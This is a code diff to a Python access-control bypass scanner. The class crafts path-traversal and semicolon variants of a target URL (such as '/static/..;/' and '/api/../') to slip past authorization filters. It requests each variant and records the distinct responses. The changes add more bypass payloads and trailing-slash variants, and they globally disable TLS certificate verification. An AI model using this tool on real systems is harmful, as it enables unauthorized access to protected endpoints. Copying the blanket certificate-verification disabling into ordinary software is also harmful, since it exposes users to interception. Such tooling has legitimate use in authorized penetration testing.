@@ -8,6 +8,7 @@ import ssl
 import urllib.request
 
 requests.packages.urllib3.disable_warnings()
+ssl._create_default_https_context = ssl._create_unverified_context
 ctx = ssl.create_default_context()
 ctx.check_hostname = False
 ctx.verify_mode = ssl.CERT_NONE
@@ -33,15 +34,15 @@ class AccessControl:
         # }
         self.proxies = {}
         self.whiteList = [
-            "/", "/;/", ";/", "/java.css/../", "/java.js/../", "/java.jpg/../",
+            "/", "/;/", ";/", "/;/../", "/java.css/../", "/java.js/../", "/java.jpg/../",
             "/java.ico/../", "/java.png/../", "/java.gif/../",
             "/java.css/..;/", "/java.js/..;/", "/java.jpg/..;/",
             "/java.ico/..;/", "/java.png/..;/", "/java.gif/..;/",
-            "/login.html/../", "/login.html/..;/", "/rest/../", "/rest/..;/",
+            "/login.html/../", "/login.html/..;/", "/res/../", "/res/..;/",
             "/static/../", "/static/..;/", "/css/../", "/css/..;/",
             "/images/../", "/images/..;/", "/themes/../", "/themes/..;/",
             "/userfiles/../", "/userfiles/..;/", "/js/../", "/js/..;/",
-            "/rest/../", "/rest/..;/"
+            "/rest/../", "/rest/..;/", "/api/../", "/api/..;/"
         ]
 
     def AnalysisUri(self):
@@ -50,10 +51,11 @@ class AccessControl:
     def AnalysisHost(self):
         return re.search('(.*?://.*?)/.*?$', self.url).group(1)
 
-    def findSlash(self, string):
+    def findSlash(self, uri):
         slashList = []
-        for i in range(len(string.split("?")[0])):
-            if string[i] == '/':
+        uri = uri if uri[-1] != "/" else uri[:-1]
+        for i in range(len(uri.split("?")[0])):
+            if uri[i] == '/':
                 slashList.append(i)
         return slashList
 
@@ -64,8 +66,14 @@ class AccessControl:
             for index in Slash:
                 if index == 0 and i == ";/":
                     continue
-                resultList.append(uri[:index] + i + uri[index + 1:])
-        return resultList
+                uriPayload = uri[:index] + i + uri[index + 1:]
+                resultList.append(uriPayload)
+                if "?" in uri and uri.split("?")[0][-1] != "/":
+                    uriPayload = uriPayload.split("?")
+                    resultList.append(uriPayload[0] + "/?"+uriPayload[1])
+                elif "?" not in uri and uri.split("?")[0][-1] != "/":
+                    resultList.append(uriPayload + "/")
+        return set(resultList)
 
     def testTargetAsUrllibGet(self, url):
         proxySupport = urllib.request.ProxyHandler(self.proxies)
@@ -97,6 +105,7 @@ class AccessControl:
             responseDict = {}
             for url in urlList:
                 try:
+                    print(url)
                     if '../' in url:
                         res = self.testTargetAsUrllibGet(url)
                     else:
@@ -111,9 +120,7 @@ class AccessControl:
                             res = res.text
                 except:
                     continue
-                if res in responseList:
-                    pass
-                else:
+                if res not in responseList:
                     responseList.append(res)
                     responseDict[url] = res[:512]
             return responseDict
@@ -156,9 +163,7 @@ class AccessControl:
                             res = res.text
             except:
                 continue
-            if res in responseList:
-                pass
-            else:
+            if res not in responseList:
                 responseList.append(res)
                 responseDict[url] = res[:512]
         return responseDict
@@ -201,7 +206,8 @@ class AccessControl:
                     print("\033[1;31mResponse Length: %s \033[0m" % len(res),
                           url.split("?")[0],
                           end="\r")
-                except:
+                except Exception as e:
+                    print(e)
                     continue
             print("*" * 60 + "Done" + "*" * 60)
             resultList.sort()
